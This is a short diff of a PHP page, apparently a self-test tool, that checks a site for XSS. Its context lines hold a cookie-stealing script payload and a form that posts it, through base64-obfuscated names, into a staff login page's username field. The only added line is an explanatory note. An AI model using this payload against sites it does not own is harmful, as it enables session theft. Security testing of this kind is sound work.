@@ -17,6 +17,7 @@ $string = "\" /><script>window.location = \"" . $this_path . "?cookie=\" + docum
     <br />
     <p>Click here to test your site for XSS vulnerability.</p>
     <p>If successful it will return cookie data.</p>
+    <p>please ignore "SQLiteManager_currentLangue=2" as it doesn't come from php</p>
     <form action="<?php ebd('Li4vcHVibGljL3N0YWZmL2xvZ2luLnBocA=='); ?>" method="post">
       <input type="hidden" name="<?php ebd('dXNlcm5hbWU='); ?>" value='<?php echo $string; ?>' />
       <input type="submit" name="submit" value="Test XSS"  />
